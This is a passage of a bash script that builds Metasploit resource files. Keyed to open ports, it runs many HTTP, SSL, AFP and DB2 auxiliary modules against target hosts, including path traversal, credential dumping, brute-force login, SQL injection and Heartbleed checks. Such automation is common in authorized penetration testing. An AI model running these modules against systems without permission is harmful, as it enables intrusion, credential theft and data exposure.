	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/netgear_sph200d_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/nginx_source_disclosure" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/novell_file_reporter_srs_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/novell_mdm_creds" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ntlm_info_enumeration" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/octopusdeploy_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/open_proxy" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/openmind_messageos_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/options" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/oracle_demantra_database_credentials_leak" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/oracle_demantra_file_retrieval" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/oracle_ilom_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/owa_ews_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/owa_iis_internal_ip" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/owa_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/phpmyadmin_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/pocketpad_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/prev_dir_same_name_file" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/radware_appdirector_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/rails_json_yaml_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/rails_mass_assignment" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/rails_xml_yaml_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/replace_ext" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/rewrite_proxy_bypass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/rfcode_reader_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/rips_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/riverbed_steelhead_vcx_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/robots_txt" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/s40_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sap_businessobjects_user_brute" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sap_businessobjects_user_brute_web" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sap_businessobjects_user_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sap_businessobjects_version_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/scraper" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sentry_cdu_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/servicedesk_plus_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sevone_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/simple_webserver_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/smt_ipmi_49152_exposure" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/smt_ipmi_cgi_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/smt_ipmi_static_cert_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/soap_xml" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sockso_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/splunk_web_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/squid_pivot_scanning" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/squiz_matrix_user_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ssl" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ssl_version" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/support_center_plus_directory_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/surgenews_user_creds" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/svn_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/svn_wcdb_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/sybase_easerver_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/symantec_brightmail_ldapcreds" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/symantec_brightmail_logfile" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/symantec_web_gateway_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/titan_ftp_admin_pwd" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/title" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/tomcat_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/tomcat_mgr_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/tplink_traversal_noauth" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/trace" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/trace_axd" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/typo3_bruteforce" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/vcms_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/verb_auth_bypass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/vhost_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wangkongbao_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/web_vulndb" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/webdav_internal_ip" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/webdav_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/webdav_website_content" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/webpagetest_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wildfly_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_content_injection" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_cp_calendar_sqli" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_ghost_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_login_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_multicall_creds" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_pingback_access" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wordpress_xmlrpc_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_contus_video_gallery_sqli" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_dukapress_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_gimedia_library_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_mobile_pack_info_disclosure" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_mobileedition_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_nextgen_galley_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_simple_backup_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/wp_subscribe_comments_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/xpath" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/yaws_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/zabbix_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/zenworks_assetmanagement_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/zenworks_assetmanagement_getconfig" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
<<http	
use auxiliary/scanner/http/a10networks_ax_directory_traversal
use auxiliary/scanner/http/accellion_fta_statecode_file_read
use auxiliary/scanner/http/adobe_xml_inject
use auxiliary/scanner/http/advantech_webaccess_login
use auxiliary/scanner/http/allegro_rompager_misfortune_cookie
use auxiliary/scanner/http/apache_activemq_source_disclosure
use auxiliary/scanner/http/apache_activemq_traversal
use auxiliary/scanner/http/apache_mod_cgi_bash_env
use auxiliary/scanner/http/apache_optionsbleed
use auxiliary/scanner/http/apache_userdir_enum
use auxiliary/scanner/http/appletv_login
use auxiliary/scanner/http/atlassian_crowd_fileaccess
use auxiliary/scanner/http/axis_local_file_include
use auxiliary/scanner/http/axis_login
use auxiliary/scanner/http/backup_file
use auxiliary/scanner/http/barracuda_directory_traversal
use auxiliary/scanner/http/bavision_cam_login
use auxiliary/scanner/http/binom3_login_config_pass_dump
use auxiliary/scanner/http/bitweaver_overlay_type_traversal
use auxiliary/scanner/http/blind_sql_query
use auxiliary/scanner/http/bmc_trackit_passwd_reset
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/buffalo_login
use auxiliary/scanner/http/buildmaster_login
use auxiliary/scanner/http/caidao_bruteforce_login
use auxiliary/scanner/http/canon_wireless
use auxiliary/scanner/http/cert
use auxiliary/scanner/http/chef_webui_login
use auxiliary/scanner/http/chromecast_webserver
use auxiliary/scanner/http/chromecast_wifi
use auxiliary/scanner/http/cisco_asa_asdm
use auxiliary/scanner/http/cisco_device_manager
use auxiliary/scanner/http/cisco_firepower_download
use auxiliary/scanner/http/cisco_firepower_login
use auxiliary/scanner/http/cisco_ios_auth_bypass
use auxiliary/scanner/http/cisco_ironport_enum
use auxiliary/scanner/http/cisco_nac_manager_traversal
use auxiliary/scanner/http/cisco_ssl_vpn
use auxiliary/scanner/http/cisco_ssl_vpn_priv_esc
use auxiliary/scanner/http/clansphere_traversal
use auxiliary/scanner/http/cnpilot_r_web_login_loot
use auxiliary/scanner/http/coldfusion_locale_traversal
use auxiliary/scanner/http/coldfusion_version
use auxiliary/scanner/http/concrete5_member_list
use auxiliary/scanner/http/copy_of_file
use auxiliary/scanner/http/crawler
use auxiliary/scanner/http/dell_idrac
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_webdav_unicode_bypass
use auxiliary/scanner/http/directadmin_login
use auxiliary/scanner/http/dlink_dir_300_615_http_login
use auxiliary/scanner/http/dlink_dir_615h_http_login
use auxiliary/scanner/http/dlink_dir_session_cgi_http_login
use auxiliary/scanner/http/dlink_user_agent_backdoor
use auxiliary/scanner/http/dnalims_file_retrieve
use auxiliary/scanner/http/docker_version
use auxiliary/scanner/http/dolibarr_login
use auxiliary/scanner/http/drupal_views_user_enum
use auxiliary/scanner/http/ektron_cms400net
use auxiliary/scanner/http/elasticsearch_traversal
use auxiliary/scanner/http/enum_wayback
use auxiliary/scanner/http/epmp1000_dump_config
use auxiliary/scanner/http/epmp1000_dump_hashes
use auxiliary/scanner/http/epmp1000_get_chart_cmd_exec
use auxiliary/scanner/http/epmp1000_ping_cmd_exec
use auxiliary/scanner/http/epmp1000_reset_pass
use auxiliary/scanner/http/epmp1000_web_login
use auxiliary/scanner/http/error_sql_injection
use auxiliary/scanner/http/etherpad_duo_login
use auxiliary/scanner/http/f5_bigip_virtual_server
use auxiliary/scanner/http/f5_mgmt_scanner
use auxiliary/scanner/http/file_same_name_dir
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/frontpage_login
use auxiliary/scanner/http/gavazzi_em_login_loot
use auxiliary/scanner/http/git_scanner
use auxiliary/scanner/http/gitlab_login
use auxiliary/scanner/http/gitlab_user_enum
use auxiliary/scanner/http/glassfish_login
use auxiliary/scanner/http/goahead_traversal
use auxiliary/scanner/http/groupwise_agents_http_traversal
use auxiliary/scanner/http/host_header_injection
use auxiliary/scanner/http/hp_imc_bims_downloadservlet_traversal
use auxiliary/scanner/http/hp_imc_faultdownloadservlet_traversal
use auxiliary/scanner/http/hp_imc_ictdownloadservlet_traversal
use auxiliary/scanner/http/hp_imc_reportimgservlt_traversal
use auxiliary/scanner/http/hp_imc_som_file_download
use auxiliary/scanner/http/hp_sitescope_getfileinternal_fileaccess
use auxiliary/scanner/http/hp_sitescope_getsitescopeconfiguration
use auxiliary/scanner/http/hp_sitescope_loadfilecontent_fileaccess
use auxiliary/scanner/http/hp_sys_mgmt_login
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_hsts
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/http_sickrage_password_leak
use auxiliary/scanner/http/http_traversal
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/httpbl_lookup
use auxiliary/scanner/http/httpdasm_directory_traversal
use auxiliary/scanner/http/iis_internal_ip
use auxiliary/scanner/http/influxdb_enum
use auxiliary/scanner/http/infovista_enum
use auxiliary/scanner/http/intel_amt_digest_bypass
use auxiliary/scanner/http/ipboard_login
use auxiliary/scanner/http/jboss_status
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/http/jenkins_command
use auxiliary/scanner/http/jenkins_enum
use auxiliary/scanner/http/jenkins_login
use auxiliary/scanner/http/joomla_bruteforce_login
use auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner
use auxiliary/scanner/http/joomla_gallerywd_sqli_scanner
use auxiliary/scanner/http/joomla_pages
use auxiliary/scanner/http/joomla_plugins
use auxiliary/scanner/http/joomla_version
use auxiliary/scanner/http/kodi_traversal
use auxiliary/scanner/http/linknat_vos_traversal
use auxiliary/scanner/http/linksys_e1500_traversal
use auxiliary/scanner/http/litespeed_source_disclosure
use auxiliary/scanner/http/lucky_punch
use auxiliary/scanner/http/majordomo2_directory_traversal
use auxiliary/scanner/http/manageengine_desktop_central_login
use auxiliary/scanner/http/manageengine_deviceexpert_traversal
use auxiliary/scanner/http/manageengine_deviceexpert_user_creds
use auxiliary/scanner/http/manageengine_securitymanager_traversal
use auxiliary/scanner/http/mediawiki_svg_fileaccess
use auxiliary/scanner/http/meteocontrol_weblog_extractadmin
use auxiliary/scanner/http/mod_negotiation_brute
use auxiliary/scanner/http/mod_negotiation_scanner
use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
use auxiliary/scanner/http/mybook_live_login
use auxiliary/scanner/http/netdecision_traversal
use auxiliary/scanner/http/netgear_sph200d_traversal
use auxiliary/scanner/http/nginx_source_disclosure
use auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess
use auxiliary/scanner/http/novell_file_reporter_srs_fileaccess
use auxiliary/scanner/http/novell_mdm_creds
use auxiliary/scanner/http/ntlm_info_enumeration
use auxiliary/scanner/http/octopusdeploy_login
use auxiliary/scanner/http/open_proxy
use auxiliary/scanner/http/openmind_messageos_login
use auxiliary/scanner/http/options
use auxiliary/scanner/http/oracle_demantra_database_credentials_leak
use auxiliary/scanner/http/oracle_demantra_file_retrieval
use auxiliary/scanner/http/oracle_ilom_login
use auxiliary/scanner/http/owa_ews_login
use auxiliary/scanner/http/owa_iis_internal_ip
use auxiliary/scanner/http/owa_login
use auxiliary/scanner/http/phpmyadmin_login
use auxiliary/scanner/http/pocketpad_login
use auxiliary/scanner/http/prev_dir_same_name_file
use auxiliary/scanner/http/radware_appdirector_enum
use auxiliary/scanner/http/rails_json_yaml_scanner
use auxiliary/scanner/http/rails_mass_assignment
use auxiliary/scanner/http/rails_xml_yaml_scanner
use auxiliary/scanner/http/replace_ext
use auxiliary/scanner/http/rewrite_proxy_bypass
use auxiliary/scanner/http/rfcode_reader_enum
use auxiliary/scanner/http/rips_traversal
use auxiliary/scanner/http/riverbed_steelhead_vcx_file_read
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/s40_traversal
use auxiliary/scanner/http/sap_businessobjects_user_brute
use auxiliary/scanner/http/sap_businessobjects_user_brute_web
use auxiliary/scanner/http/sap_businessobjects_user_enum
use auxiliary/scanner/http/sap_businessobjects_version_enum
use auxiliary/scanner/http/scraper
use auxiliary/scanner/http/sentry_cdu_enum
use auxiliary/scanner/http/servicedesk_plus_traversal
use auxiliary/scanner/http/sevone_enum
use auxiliary/scanner/http/simple_webserver_traversal
use auxiliary/scanner/http/smt_ipmi_49152_exposure
use auxiliary/scanner/http/smt_ipmi_cgi_scanner
use auxiliary/scanner/http/smt_ipmi_static_cert_scanner
use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal
use auxiliary/scanner/http/soap_xml
use auxiliary/scanner/http/sockso_traversal
use auxiliary/scanner/http/splunk_web_login
use auxiliary/scanner/http/squid_pivot_scanning
use auxiliary/scanner/http/squiz_matrix_user_enum
use auxiliary/scanner/http/ssl
use auxiliary/scanner/http/ssl_version
use auxiliary/scanner/http/support_center_plus_directory_traversal
use auxiliary/scanner/http/surgenews_user_creds
use auxiliary/scanner/http/svn_scanner
use auxiliary/scanner/http/svn_wcdb_scanner
use auxiliary/scanner/http/sybase_easerver_traversal
use auxiliary/scanner/http/symantec_brightmail_ldapcreds
use auxiliary/scanner/http/symantec_brightmail_logfile
use auxiliary/scanner/http/symantec_web_gateway_login
use auxiliary/scanner/http/titan_ftp_admin_pwd
use auxiliary/scanner/http/title
use auxiliary/scanner/http/tomcat_enum
use auxiliary/scanner/http/tomcat_mgr_login
use auxiliary/scanner/http/tplink_traversal_noauth
use auxiliary/scanner/http/trace
use auxiliary/scanner/http/trace_axd
use auxiliary/scanner/http/typo3_bruteforce
use auxiliary/scanner/http/vcms_login
use auxiliary/scanner/http/verb_auth_bypass
use auxiliary/scanner/http/vhost_scanner
use auxiliary/scanner/http/wangkongbao_traversal
use auxiliary/scanner/http/web_vulndb
use auxiliary/scanner/http/webdav_internal_ip
use auxiliary/scanner/http/webdav_scanner
use auxiliary/scanner/http/webdav_website_content
use auxiliary/scanner/http/webpagetest_traversal
use auxiliary/scanner/http/wildfly_traversal
use auxiliary/scanner/http/wordpress_content_injection
use auxiliary/scanner/http/wordpress_cp_calendar_sqli
use auxiliary/scanner/http/wordpress_ghost_scanner
use auxiliary/scanner/http/wordpress_login_enum
use auxiliary/scanner/http/wordpress_multicall_creds
use auxiliary/scanner/http/wordpress_pingback_access
use auxiliary/scanner/http/wordpress_scanner
use auxiliary/scanner/http/wordpress_xmlrpc_login
use auxiliary/scanner/http/wp_contus_video_gallery_sqli
use auxiliary/scanner/http/wp_dukapress_file_read
use auxiliary/scanner/http/wp_gimedia_library_file_read
use auxiliary/scanner/http/wp_mobile_pack_info_disclosure
use auxiliary/scanner/http/wp_mobileedition_file_read
use auxiliary/scanner/http/wp_nextgen_galley_file_read
use auxiliary/scanner/http/wp_simple_backup_file_read
use auxiliary/scanner/http/wp_subscribe_comments_file_read
use auxiliary/scanner/http/xpath
use auxiliary/scanner/http/yaws_traversal
use auxiliary/scanner/http/zabbix_login
use auxiliary/scanner/http/zenworks_assetmanagement_fileaccess
use auxiliary/scanner/http/zenworks_assetmanagement_getconfig
http
	fi
	#ssl
	if echo "${var[@]}" | grep -w "443" &>/dev/null; then  
	echo "use auxiliary/scanner/ssl/bleichenbacher_oracle" >> ssl.rc
	echo "set RHOSTS $RHOSTS" >>ssl.rc
	echo "exploit" >>ssl.rc
	echo "back" >>ssl.rc
	echo "use auxiliary/scanner/ssl/openssl_ccs" >> ssl.rc
	echo "set RHOSTS $RHOSTS" >>ssl.rc
	echo "exploit" >>ssl.rc
	echo "back" >>ssl.rc
	echo "use auxiliary/scanner/ssl/openssl_heartbleed" >> ssl.rc
	echo "set RHOSTS $RHOSTS" >>ssl.rc
	echo "exploit" >>ssl.rc
	echo "back" >>ssl.rc
<<ssl	
use auxiliary/scanner/ssl/bleichenbacher_oracle
use auxiliary/scanner/ssl/openssl_ccs
use auxiliary/scanner/ssl/openssl_heartbleed
ssl
	fi
	if echo "${var[@]}" | grep -w "548" &>/dev/null; then
	echo "use auxiliary/scanner/afp/afp_login" >> afp.rc
	echo "set RHOSTS $RHOSTS" >>afp.rc
	echo "exploit" >>afp.rc
	echo "back" >>afp.rc
	echo "use auxiliary/scanner/afp/afp_server_info" >> afp.rc
	echo "set RHOSTS $RHOSTS" >>afp.rc
	echo "exploit" >>afp.rc
	echo "back" >>afp.rc
<<afp
use auxiliary/scanner/afp/afp_login
use auxiliary/scanner/afp/afp_server_info
afp
	fi
	if echo "${var[@]}" | grep -w "523" &>/dev/null; then
	echo "use auxiliary/scanner/db2/db2_auth" >> db2.rc
